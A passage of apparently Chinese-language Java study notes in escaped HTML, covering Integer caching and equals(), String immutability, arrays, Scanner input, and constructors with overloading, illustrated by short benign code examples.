&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Integer&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// NullPointerException
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>所有包装类型都是不变类，和String一样通过内部的&lt;code>private final int&lt;/code>字段实现，无法派生子类&lt;/li>
&lt;li>判断值类型的变量是否相等可用&lt;code>==&lt;/code>，但是包装类型必须用&lt;code>equals&lt;/code>比较（引用类型存在值相等但指向不同对象的情况）！！！详细的演示&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Integer&lt;/span> &lt;span style="color:#111">x&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">127&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Integer&lt;/span> &lt;span style="color:#111">y&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">127&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Integer&lt;/span> &lt;span style="color:#111">m&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">99999&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Integer&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">99999&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;x == y: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#111">y&lt;/span>&lt;span style="color:#f92672">));&lt;/span> &lt;span style="color:#75715e">// true
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;m == n: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">));&lt;/span> &lt;span style="color:#75715e">// false
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;x.equals(y): &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">equals&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">y&lt;/span>&lt;span style="color:#f92672">));&lt;/span> &lt;span style="color:#75715e">// true
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;m.equals(n): &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">equals&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">));&lt;/span> &lt;span style="color:#75715e">// true
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>==&lt;/code>比较，较小的两个相同的&lt;code>Integer&lt;/code>返回&lt;code>true&lt;/code>，较大的两个相同的&lt;code>Integer&lt;/code>返回&lt;code>false&lt;/code>，这是因为&lt;code>Integer&lt;/code>是不变类，编译器把&lt;code>Integer x = 127;&lt;/code>自动变为&lt;code>Integer x = Integer.valueOf(127);&lt;/code>&lt;/p>
&lt;p>为了节省内存，&lt;code>Integer.valueOf()&lt;/code>对于较小的数，始终返回相同的实例，因此&lt;code>==&lt;/code>比较“恰好”为&lt;code>true&lt;/code>，但我们绝不能因为Java标准库的&lt;code>Integer&lt;/code>内部有缓存优化就用&lt;code>==&lt;/code>比较，必须用&lt;code>equals()&lt;/code>方法比较两个&lt;code>Integer&lt;/code>&lt;/p>
&lt;ul>
&lt;li>因为&lt;code>Integer.valueOf()&lt;/code>可能始终返回同一个&lt;code>Integer&lt;/code>实例，因此，在我们自己创建&lt;code>Integer&lt;/code>的时候，以下两种方法：&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>Integer n = new Integer(100);
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>Integer n = Integer.valueOf(100);
&lt;/code>&lt;/pre>&lt;p>方法二更好，不用每次都new新的实例而是直接使用静态工厂方法进行调用，它会做到内部优化，尽可能地返回缓存的实例以节省内存&lt;/p>
&lt;ul>
&lt;li>&lt;code>String&lt;/code>作引用类型，类似c中的指针，内部存储一个指向内存中的地址&lt;/li>
&lt;li>加上&lt;code>final&lt;/code>表示常量，创建实例后无法修改&lt;/li>
&lt;li>类型名过长时可用&lt;code>var&lt;/code>代替&lt;/li>
&lt;li>&lt;code>instanceof()&lt;/code>确定类型&lt;/li>
&lt;/ul>
&lt;h3 id="运算">运算&lt;/h3>
&lt;ul>
&lt;li>溢出不报错，注意自检&lt;/li>
&lt;li>优先级太多记不住，统一加括号完事了&lt;/li>
&lt;li>两种类型不同的数进行运算时会存在类型的隐式转换（short+int -&amp;gt; int+int），注意运算精度&lt;/li>
&lt;li>整数运算很准确，没有必要为了节省内存而使用&lt;code>byte&lt;/code>和&lt;code>short&lt;/code>进行整数运算&lt;/li>
&lt;li>整数运算在除数为&lt;code>0&lt;/code>时会报错，而浮点数运算在除数为&lt;code>0&lt;/code>时，不会报错，返回&lt;code>NAN&lt;/code> or &lt;code>Infinity&lt;/code> or &lt;code>-Infinity&lt;/code>&lt;/li>
&lt;li>布尔关系和三元运算中注意逻辑短路&lt;/li>
&lt;li>三元运算&lt;code>b ? x : y&lt;/code>后面的类型必须相同&lt;/li>
&lt;/ul>
&lt;h3 id="字符字符串">字符&amp;amp;字符串&lt;/h3>
&lt;ul>
&lt;li>Java的&lt;code>String&lt;/code>和&lt;code>char&lt;/code>在内存中总是以Unicode编码表示&lt;/li>
&lt;li>字符char用&lt;code>''&lt;/code>，字符串用&lt;code>&amp;quot;&amp;quot;&lt;/code>（空字符串不等于null），字符串拼接存在类型隐式转换，&lt;code>&amp;quot;&amp;quot;&amp;quot; &amp;quot;&amp;quot;&amp;quot;&lt;/code>写多行字符串（同py）&lt;/li>
&lt;li>java中的字符串赋值操作可直接联想c的指针进行理解，通过内部的&lt;code>private final char[]&lt;/code>字段 以及没有任何修改&lt;code>char[]&lt;/code>的方法实现字符串的不可变性；基于这一点，如果传入的对象有可能改变，我们需要复制而不是直接引用&lt;/li>
&lt;li>字符串比较必须用&lt;code>equals()&lt;/code>或&lt;code>equalsIgnoreCase()&lt;/code>，不可偷懒用&lt;code>==&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>更多字符串的用法可几乎等同于Python，不列举&lt;/p>
&lt;ul>
&lt;li>&lt;code>String&lt;/code>和&lt;code>char[]&lt;/code>类型可以互相转换&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>char[] cs = &amp;#34;Hello&amp;#34;.toCharArray(); // String -&amp;gt; char[]
String s = new String(cs); // char[] -&amp;gt; String
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>如果修改了&lt;code>char[]&lt;/code>数组，&lt;code>String&lt;/code>并不会改变&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">char&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">cs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;Hello&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toCharArray&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">cs&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">cs&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;X&amp;#39;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这是因为通过&lt;code>new String(char[])&lt;/code>创建新的&lt;code>String&lt;/code>实例时，它并不会直接引用传入的&lt;code>char[]&lt;/code>数组，而是会复制一份，所以，修改外部的&lt;code>char[]&lt;/code>数组不会影响&lt;code>String&lt;/code>实例内部的&lt;code>char[]&lt;/code>数组，因为这是两个不同的数组&lt;/p>
&lt;ul>
&lt;li>早期的String总以char[]进行存储&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">String&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">offset&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">count&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>而较新的JDK版本的&lt;code>String&lt;/code>则以&lt;code>byte[]&lt;/code>存储：如果&lt;code>String&lt;/code>仅包含ASCII字符，则每个&lt;code>byte&lt;/code>存储一个字符，否则，每两个&lt;code>byte&lt;/code>存储一个字符，这样做的目的是为了节省内存，因为大量的长度较短的&lt;code>String&lt;/code>通常仅包含ASCII字符&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">String&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span> &lt;span style="color:#111">coder&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#75715e">// 0 = LATIN1, 1 = UTF16
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>对于使用者来说，&lt;code>String&lt;/code>内部的优化不影响任何已有代码，因为它的&lt;code>public&lt;/code>方法签名是不变的&lt;/p>
&lt;h3 id="数组">数组&lt;/h3>
&lt;ul>
&lt;li>新建数组&lt;code>int[] n = new int[5];&lt;/code>，大小不可变，为引用类型&lt;/li>
&lt;li>对于数组元素（或所有可迭代的数据类型）的遍历直接使用&lt;code>for(int n:na){}&lt;/code>，缺点是无法指定遍历顺序，无法获取数组索引（n直接代表元素）&lt;/li>
&lt;li>快速打印数组内容&lt;code>System.out.println(Arrays.toString(ns));&lt;/code>&lt;/li>
&lt;li>快速打印二维数组内容&lt;code>System.out.println(Arrays.deepToString(ns));&lt;/code>&lt;/li>
&lt;li>可变参数用&lt;code>类型...&lt;/code>定义，可变参数相当于数组类型&lt;/li>
&lt;/ul>
&lt;h3 id="流程控制">流程控制&lt;/h3>
&lt;ul>
&lt;li>读取输入需要&lt;code>import java.util.Scanner&lt;/code>，由&lt;code>Scanner&lt;/code>对象进行读入操作&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Scanner&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">hello&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Scanner&lt;/span> &lt;span style="color:#111">scanner&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Scanner&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">in&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">print&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Input your name: &amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">scanner&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">nextLine&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">print&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Input your age: &amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">age&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">scanner&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">nextInt&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">printf&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Hi, %s, you are %d\n&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">age&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>switch语句不要忘break，case不用花括号&lt;/li>
&lt;li>&lt;code>default&lt;/code>语句，可以在漏写某个枚举常量时自动报错，从而及时发现错误&lt;/li>
&lt;/ul>
&lt;h2 id="oop基础">OOP基础&lt;/h2>
&lt;h3 id="类实例">类&amp;amp;实例&lt;/h3>
&lt;ul>
&lt;li>对象靠new&lt;/li>
&lt;li>一个java源文件可以包含多个类的定义，但只能定义一个public类，且public类名必须与文件名一致；如果要定义多个public类，必须拆到多个Java源文件中&lt;/li>
&lt;/ul>
&lt;h3 id="方法">方法&lt;/h3>
&lt;ul>
&lt;li>语法&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>修饰符 方法返回类型 方法名(方法参数列表) {
若干方法语句;
return 方法返回值;
}
// 无return 返回类型为void
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>变量设为private后可以通过public对外的方法间接修改&lt;/li>
&lt;li>没事儿就尽可能少用public，少暴露对外的方法&lt;/li>
&lt;li>与类名相同的方法作为construct构造方法，无返回值&lt;/li>
&lt;li>先初始化字段，再执行构造方法（可覆盖前面的&lt;/li>
&lt;li>可定义多个构造方法（传入参数类型 数量不同），new时会自动匹配；一个构造方法可以调用其他构造方法（便于代码复用），语法&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Person&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">age&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">Person&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">age&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">age&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">age&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">Person&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">18&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// 调用另一个构造方法Person(String, int)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">Person&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Unnamed&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// 调用另一个构造方法Person(String)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>非构造方法也可有多个重名的（参数不同 返回值通常相同），称为方法重载(Overload)，便于用一个名字处理多种参数输入&lt;/li>
&lt;/ul>
